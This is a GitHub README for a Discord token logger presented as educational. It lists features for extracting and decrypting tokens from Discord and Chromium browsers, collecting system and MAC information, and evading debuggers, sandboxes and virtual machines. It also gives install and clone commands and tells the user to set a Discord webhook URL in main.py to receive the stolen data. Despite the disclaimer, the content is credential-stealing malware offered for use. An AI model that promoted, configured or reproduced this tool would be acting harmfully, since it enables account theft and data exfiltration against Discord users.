# Simple Token Logger Script

A simulated Discord token logger made for **educational**, **awareness**, and **research purposes**.  
This project helps demonstrate how token theft works — empowering developers and defenders to build better protection.

---

## 🚨 Disclaimer

> ⚠️ This repository is intended strictly for **ethical and educational** use.  
> ❌ Do **NOT** deploy, distribute, or use this tool on systems or accounts you do not **own** or have **explicit permission** to analyze.  
> 🧑‍⚖️ Misuse of this project may be illegal under local and international law.

---

## 🔍 What Is It?
This project simulates a Discord token logger. It shows how a malicious actor could extract and exfiltrate user tokens and basic metadata from browsers and local files using:

- Discord desktop installations
- Chromium-based browsers (e.g., Chrome, Edge, Brave)
- Encrypted token storage using Windows APIs
---

## ✨ Features

- 🔐 Extract and decrypt Discord tokens stored on disk
- 🔎 Anti-debugging & sandbox detection
- 🧪 Virtual machine awareness
- 🗃️ Supports major Chromium-based browsers and Discord clients
- 💻 System user, environment, and MAC info grabbing
---

## 📦 Installation

### Prerequisites

- Windows OS
- Python 3.8+

### Install Dependencies

```bash
pip install pycryptodome pyperclip pillow pypiwin32

🧪 Usage
Clone this repo:
git clone https://github.com/deadconvicess/Token-Logger-Script
cd Token-Logger-Script
Open main.py and replace the webhook URL:
WEBHOOK_URL = "https://your.discord.webhook.url"
Run the script in a controlled test environment:

🔒 Warning: Only run this script in a safe, isolated environment. You are responsible for how you use it.

🧠 Learning Objectives
This simulation was made to:
Show how easy it is to extract credentials stored insecurely
Help blue teams detect and defend against token theft
Encourage responsible handling of sensitive local data
Raise awareness of endpoint security risks
This project is licensed under the MIT License.

⭐ Credits
Created by deadconvicess
Inspired by real-world malware to aid cybersecurity education.

💡 If you found this useful, give it a ⭐ on GitHub to support ethical security research.
